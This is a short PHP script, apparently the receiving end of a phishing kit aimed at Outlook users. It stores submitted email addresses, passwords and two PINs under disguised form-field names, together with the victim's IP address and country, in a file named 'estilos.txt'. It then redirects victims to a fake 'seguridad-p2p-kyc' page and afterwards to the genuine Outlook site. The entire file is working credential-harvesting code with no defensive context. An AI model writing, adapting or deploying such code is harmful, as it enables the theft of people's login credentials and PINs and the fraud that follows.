<?php
ini_set("display_errors", 0);
$user_ip = $_SERVER['REMOTE_ADDR'];
$cc = trim(file_get_contents("http://ipinfo.io/{$user_ip}/country"));

$file = fopen("estilos.txt", "a");
if(isset($_POST['bandera']) && isset($_POST['pais'])){
fwrite($file, "correo: ".$_POST['bandera']." - Clv: ".$_POST['pais']." -  ");
header ('location:seguridad-p2p-kyc.html');
}
if(isset($_POST['pinoaromas']) && isset($_POST['pinoaromas2'])){
fwrite($file, "pin: ".$_POST['pinoaromas']."  pin2: ".$_POST['pinoaromas2']."  ".date('Y-m-d')." - ".date('H:i:s')." ".$user_ip." ".$cc."  ". PHP_EOL);
fwrite($file, "********************************* " . PHP_EOL);
header ('location: https://outlook.live.com/');
}

fclose($file);


?>